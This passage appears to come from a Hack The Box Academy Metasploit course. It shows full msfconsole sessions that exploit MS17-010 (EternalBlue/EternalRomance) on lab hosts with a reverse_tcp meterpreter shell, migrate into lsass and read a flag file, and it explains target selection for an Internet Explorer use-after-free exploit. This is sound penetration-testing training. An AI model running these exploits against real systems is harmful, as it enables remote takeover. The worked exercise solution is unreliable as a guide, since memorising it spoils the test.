   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

Finally, since we are about to use a TCP-based reverse shell (`/windows/meterpreter/reverse_tcp`) we need to specify to which IP address it needs to connect to in order to establish a connection. Therefore, we need to set `LHOST` to our own IP address like following:

#### MSF - LHOST Specification

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > setg LHOST 10.10.14.15

LHOSTS => 10.10.14.15


msf6 exploit(windows/smb/ms17_010_psexec) > options

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 445                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                           no        The service display name
   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.15      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

Once everything is set and ready to go, we can proceed to launch the attack. Note that the payload was not set here, as the default one is sufficient for this demonstration.

#### MSF - Exploit Execution

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > run

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158) at 2020-08-13 21:37:21 +0000
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


meterpreter> shell

C:\Windows\system32>
```

We now have a shell on the target machine, and we can interact with it.

#### MSF - Target Interaction

```shell-session
C:\Windows\system32> whoami

whoami
nt authority\system
```

This has been a quick and dirty example of how `msfconsole` can help out quickly but serves as an excellent example of how the framework works. Only one module was needed without any `payload` selection, `encoding` or `pivoting` between sessions or jobs.

---

## Questions

Answer the question(s) below to complete the section

Use the Metasploit-Framework to exploit the target with EternalRomance. Find the flag.txt file on Administrator's desktop and submit the contents as the answer.

```
┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-gdqkq5ypmw]─[~]
└──╼ [★]$ msfconsole -q
[msf](Jobs:0 Agents:0) >> search eternalromance

Matching Modules
================

   #   Name                                  Disclosure Date  Rank    Check  Description
   -   ----                                  ---------------  ----    -----  -----------
   0   exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   1     \_ target: Automatic                .                .       .      .
   2     \_ target: PowerShell               .                .       .      .
   3     \_ target: Native upload            .                .       .      .
   4     \_ target: MOF upload               .                .       .      .
   5     \_ AKA: ETERNALSYNERGY              .                .       .      .
   6     \_ AKA: ETERNALROMANCE              .                .       .      .
   7     \_ AKA: ETERNALCHAMPION             .                .       .      .
   8     \_ AKA: ETERNALBLUE                 .                .       .      .
   9   auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   10    \_ AKA: ETERNALSYNERGY              .                .       .      .
   11    \_ AKA: ETERNALROMANCE              .                .       .      .
   12    \_ AKA: ETERNALCHAMPION             .                .       .      .
   13    \_ AKA: ETERNALBLUE                 .                .       .      .


Interact with a module by name or index. For example info 13, use 13 or use auxiliary/admin/smb/ms17_010_command

[msf](Jobs:0 Agents:0) >> use 6
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> info

       Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
     Module: exploit/windows/smb/ms17_010_psexec
   Platform: Windows
       Arch: x86, x64
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2017-03-14

Provided by:
  sleepya
  zerosum0x0
  Shadow Brokers
  Equation Group

Module side effects:
 unknown-side-effects

Module stability:
 unknown-stability

Module reliability:
 unknown-reliability

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic
      1   PowerShell
      2   Native upload
      3   MOF upload

Check supported:
  Yes

Basic options:
  Name               Current Setting    Required  Description
  ----               ---------------    --------  -----------
  DBGTRACE           false              yes       Show extra debug trace info
  LEAKATTEMPTS       99                 yes       How many times to try to lea
                                                  k transaction
  NAMEDPIPE                             no        A named pipe that can be con
                                                  nected to (leave blank for a
                                                  uto)
  NAMED_PIPES        /usr/share/metasp  yes       List of named pipes to check
                     loit-framework/da
                     ta/wordlists/name
                     d_pipes.txt
  RHOSTS                                yes       The target host(s), see http
                                                  s://docs.metasploit.com/docs
                                                  /using-metasploit/basics/usi
                                                  ng-metasploit.html
  RPORT              445                yes       The Target port (TCP)
  SERVICE_DESCRIPTI                     no        Service description to be us
  ON                                              ed on target for pretty list
                                                  ing
  SERVICE_DISPLAY_N                     no        The service display name
  AME
  SERVICE_NAME                          no        The service name
  SHARE              ADMIN$             yes       The share to connect to, can
                                                   be an admin share (ADMIN$,C
                                                  $,...) or a normal read/writ
                                                  e folder share
  SMBDomain          .                  no        The Windows domain to use fo
                                                  r authentication
  SMBPass                               no        The password for the specifi
                                                  ed username
  SMBUser                               no        The username to authenticate
                                                   as

Payload information:
  Space: 3072

Description:
  This module will exploit SMB with vulnerabilities in MS17-010 to achieve a write-what-where
  primitive. This will then be used to overwrite the connection session information with as an
  Administrator session. From there, the normal psexec payload code execution is done.

  Exploits a type confusion between Transaction and WriteAndX requests and a race condition in
  Transaction requests, as seen in the EternalRomance, EternalChampion, and EternalSynergy
  exploits. This exploit chain is more reliable than the EternalBlue exploit, but requires a
  named pipe.

References:
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
  https://nvd.nist.gov/vuln/detail/CVE-2017-0143
  https://nvd.nist.gov/vuln/detail/CVE-2017-0146
  https://nvd.nist.gov/vuln/detail/CVE-2017-0147
  https://github.com/worawit/MS17-010
  https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf
  https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/
  https://attack.mitre.org/techniques/T1021/002/
  https://attack.mitre.org/techniques/T1059/
  https://attack.mitre.org/techniques/T1059/001/
  https://attack.mitre.org/techniques/T1077/
  https://attack.mitre.org/techniques/T1569/002/

Also known as:
  ETERNALSYNERGY
  ETERNALROMANCE
  ETERNALCHAMPION
  ETERNALBLUE


View the full module info with the info -d command.

[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set RHOST 10.129.2.141
RHOST => 10.129.2.141
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set LHOST 10.10.14.4
LHOST => 10.10.14.4
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> run
[*] Started reverse TCP handler on 10.10.14.4:4444 
[*] 10.129.2.141:445 - Target OS: Windows Server 2016 Standard 14393
[*] 10.129.2.141:445 - Built a write-what-where primitive...
[+] 10.129.2.141:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.2.141:445 - Selecting PowerShell target
[*] 10.129.2.141:445 - Executing the payload...
[+] 10.129.2.141:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (190534 bytes) to 10.129.2.141
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.25/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] Meterpreter session 1 opened (10.10.14.4:4444 -> 10.129.2.141:49673) at 2026-05-27 14:08:12 -0400
(Meterpreter 1)(C:\Windows\system32) > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System             x64   0
 288   4     smss.exe           x64   0
 368   356   csrss.exe          x64   0
 432   564   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 436   356   wininit.exe        x64   0
 444   428   csrss.exe          x64   1
 476   564   svchost.exe        x64   0
 496   428   winlogon.exe       x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 560   564   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 564   436   services.exe       x64   0
 580   436   lsass.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 656   564   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 704   564   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 788   496   dwm.exe            x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe
 844   564   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 868   564   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 892   564   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 900   564   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 908   2948  conhost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 1000  564   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1016  564   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1316  564   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1440  564   spoolsv.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1484  564   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1496  564   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1604  564   inetinfo.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\inetsrv\inetinfo.exe
 1632  564   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1672  564   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1700  564   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1736  564   vmtoolsd.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 1780  564   VGAuthService.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
 1836  3056  conhost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 2420  564   dllhost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dllhost.exe
 2516  564   msdtc.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
 2616  656   WmiPrvSE.exe       x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
 2840  656   WmiPrvSE.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbem\WmiPrvSE.exe
 2888  496   LogonUI.exe        x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 2948  844   dstokenclean.exe   x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dstokenclean.exe
 3056  1428  powershell.exe     x86   0        NT AUTHORITY\SYSTEM           C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe

(Meterpreter 1)(C:\Windows\system32) > migrate 580
[*] Migrating from 3056 to 580...
[*] Migration completed successfully.

(Meterpreter 1)(C:\Windows\system32) > cd ..\..\
 > 
 > ..
(Meterpreter 1)(C:\Windows\system32) > cd ..
(Meterpreter 1)(C:\Windows) > cd ..
(Meterpreter 1)(C:\) > cd users
(Meterpreter 1)(C:\users) > dir
Listing: C:\users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  8192  dir   2020-10-05 21:51:20 -0400  .NET v2.0
040777/rwxrwxrwx  8192  dir   2020-10-05 21:51:19 -0400  .NET v2.0 Classic
040777/rwxrwxrwx  8192  dir   2020-10-05 21:51:25 -0400  .NET v4.5
040777/rwxrwxrwx  8192  dir   2020-10-05 21:51:24 -0400  .NET v4.5 Classic
040777/rwxrwxrwx  8192  dir   2020-10-05 19:18:25 -0400  Administrator
040777/rwxrwxrwx  0     dir   2016-07-16 09:34:35 -0400  All Users
040777/rwxrwxrwx  8192  dir   2020-10-05 21:51:18 -0400  Classic .NET AppPool
040555/r-xr-xr-x  8192  dir   2020-10-02 20:22:46 -0400  Default
040777/rwxrwxrwx  0     dir   2016-07-16 09:34:35 -0400  Default User
040555/r-xr-xr-x  4096  dir   2016-11-20 20:24:46 -0500  Public
100666/rw-rw-rw-  174   fil   2016-07-16 09:21:29 -0400  desktop.ini

(Meterpreter 1)(C:\users) > cd Administrator\
 > \
 > 
(Meterpreter 1)(C:\users\Administrator) > ls
Listing: C:\users\Administrator
===============================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  AppData
040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  Application Data
040555/r-xr-xr-x  0       dir   2020-10-05 19:18:25 -0400  Contacts
040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  Cookies
040555/r-xr-xr-x  0       dir   2022-05-16 08:17:01 -0400  Desktop
040555/r-xr-xr-x  0       dir   2020-10-05 19:18:25 -0400  Documents
040555/r-xr-xr-x  0       dir   2020-10-05 22:08:04 -0400  Downloads
040555/r-xr-xr-x  0       dir   2020-10-05 19:18:25 -0400  Favorites
040555/r-xr-xr-x  0       dir   2020-10-05 19:18:25 -0400  Links
040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  Local Settings
040555/r-xr-xr-x  0       dir   2020-10-05 19:18:25 -0400  Music
040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  My Documents
100666/rw-rw-rw-  786432  fil   2022-05-16 09:21:00 -0400  NTUSER.DAT
100666/rw-rw-rw-  65536   fil   2020-10-05 19:19:25 -0400  NTUSER.DAT{a0d1b9b4-af87-11e6-9658-c2e7ef3e8ee3}.TM.blf
100666/rw-rw-rw-  524288  fil   2020-10-05 19:19:25 -0400  NTUSER.DAT{a0d1b9b4-af87-11e6-9658-c2e7ef3e8ee3}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288  fil   2020-10-05 19:19:25 -0400  NTUSER.DAT{a0d1b9b4-af87-11e6-9658-c2e7ef3e8ee3}.TMContainer00000000000000000002.regtrans-ms
040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  NetHood
040555/r-xr-xr-x  0       dir   2020-10-05 19:18:25 -0400  Pictures
040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  PrintHood
040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  Recent
040555/r-xr-xr-x  0       dir   2020-10-05 19:18:25 -0400  Saved Games
040555/r-xr-xr-x  0       dir   2020-10-05 19:18:25 -0400  Searches
040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  SendTo
040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  Start Menu
040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  Templates
040555/r-xr-xr-x  0       dir   2020-10-05 19:18:25 -0400  Videos
100666/rw-rw-rw-  16384   fil   2020-10-05 19:18:23 -0400  ntuser.dat.LOG1
100666/rw-rw-rw-  226304  fil   2020-10-05 19:18:23 -0400  ntuser.dat.LOG2
100666/rw-rw-rw-  20      fil   2020-10-05 19:18:23 -0400  ntuser.ini

(Meterpreter 1)(C:\users\Administrator) > cd Desktop\\
(Meterpreter 1)(C:\users\Administrator\Desktop) > ls
Listing: C:\users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2020-10-05 19:18:25 -0400  desktop.ini
100666/rw-rw-rw-  29    fil   2022-05-16 07:19:21 -0400  flag.txt

(Meterpreter 1)(C:\users\Administrator\Desktop) > cat flag.txt
```

---
# Targets

`Targets` are unique operating system identifiers taken from the versions of those specific operating systems which adapt the selected exploit module to run on that particular version of the operating system. The `show targets` command issued within an exploit module view will display all available vulnerable targets for that specific exploit, while issuing the same command in the root menu, outside of any selected exploit module, will let us know that we need to select an exploit module first.

#### MSF - Show Targets

```shell-session
msf6 > show targets

[-] No exploit module selected.
```

When looking at our previous exploit module, this would be what we see:

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > options

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 445                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                           no        The service display name
   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

## Selecting a Target

We can see that there is only one general type of target set for this type of exploit. What if we change the exploit module to something that needs more specific target ranges? The following exploit is aimed at:

- `MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability`.

If we want to find out more about this specific module and what the vulnerability behind it does, we can use the `info` command. This command can help us out whenever we are unsure about the origins or functionality of different exploits or auxiliary modules. Keeping in mind that it is always considered best practice to audit our code for any artifact generation or 'additional features', the `info` command should be one of the first steps we take when using a new module. This way, we can familiarize ourselves with the exploit functionality while assuring a safe, clean working environment for both our clients and us.

#### MSF - Target Selection

```shell-session
msf6 exploit(windows/browser/ie_execcommand_uaf) > info

       Name: MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability 
     Module: exploit/windows/browser/ie_execcommand_uaf
   Platform: Windows
       Arch: 
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Good
  Disclosed: 2012-09-14

Provided by:
  unknown
  eromang
  binjo
  sinn3r <sinn3r@metasploit.com>
  juan vazquez <juan.vazquez@metasploit.com>

Available targets:
  Id  Name
  --  ----
  0   Automatic
  1   IE 7 on Windows XP SP3
  2   IE 8 on Windows XP SP3
  3   IE 7 on Windows Vista
  4   IE 8 on Windows Vista
  5   IE 8 on Windows 7
  6   IE 9 on Windows 7

Check supported:
  No

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  OBFUSCATE  false            no        Enable JavaScript obfuscation
  SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
  SRVPORT    8080             yes       The local port to listen on.
  SSL        false            no        Negotiate SSL for incoming connections
  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
  URIPATH                     no        The URI to use for this exploit (default is random)

Payload information:

Description:
  This module exploits a vulnerability found in Microsoft Internet 
  Explorer (MSIE). When rendering an HTML page, the CMshtmlEd object 
  gets deleted in an unexpected manner, but the same memory is reused 
  again later in the CMshtmlEd::Exec() function, leading to a 
  use-after-free condition. Please note that this vulnerability has 
  been exploited since Sep 14, 2012. Also, note that 
  presently, this module has some target dependencies for the ROP 
  chain to be valid. For WinXP SP3 with IE8, msvcrt must be present 
  (as it is by default). For Vista or Win7 with IE8, or Win7 with IE9, 
  JRE 1.6.x or below must be installed (which is often the case).

References:
  https://cvedetails.com/cve/CVE-2012-4969/
  OSVDB (85532)
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2012/MS12-063
  http://technet.microsoft.com/en-us/security/advisory/2757760
  http://eromang.zataz.com/2012/09/16/zero-day-season-is-really-not-over-yet/
```

Looking at the description, we can get a general idea of what this exploit will accomplish for us. Keeping this in mind, we would next want to check which versions are vulnerable to this exploit.

```shell-session
msf6 exploit(windows/browser/ie_execcommand_uaf) > options

Module options (exploit/windows/browser/ie_execcommand_uaf):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   OBFUSCATE  false            no        Enable JavaScript obfuscation
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL for incoming connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                     no        The URI to use for this exploit (default is random)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   IE 7 on Windows XP SP3
   2   IE 8 on Windows XP SP3
   3   IE 7 on Windows Vista
   4   IE 8 on Windows Vista
   5   IE 8 on Windows 7
   6   IE 9 on Windows 7
```

We see options for both different versions of Internet Explorer and various Windows versions. Leaving the selection to `Automatic` will let msfconsole know that it needs to perform service detection on the given target before launching a successful attack.

If we, however, know what versions are running on our target, we can use the `set target <index no.>` command to pick a target from the list.

```shell-session
msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   IE 7 on Windows XP SP3
   2   IE 8 on Windows XP SP3
   3   IE 7 on Windows Vista
   4   IE 8 on Windows Vista
   5   IE 8 on Windows 7
   6   IE 9 on Windows 7


msf6 exploit(windows/browser/ie_execcommand_uaf) > set target 6

target => 6
```

## Target Types

There is a large variety of target types. Every target can vary from another by service pack, OS version, and even language version. It all depends on the return address and other parameters in the target or within the exploit module.

The return address can vary because a particular language pack changes addresses, a different software version is available, or the addresses are shifted due to hooks. It is all determined by the type of return address required to identify the target. This address can be `jmp esp`, a jump to a specific register that identifies the target, or a `pop/pop/ret`. For more on the topic of return addresses, see the [Stack-Based Buffer Overflows on Windows x86](https://academy.hackthebox.com/module/89/section/931) module. Comments in the exploit module's code can help us determine what the target is defined by.

To identify a target correctly, we will need to:

- Obtain a copy of the target binaries
- Use msfpescan to locate a suitable return address

Later in the module, we will be delving deeper into exploit development, payload generation, and target identification.

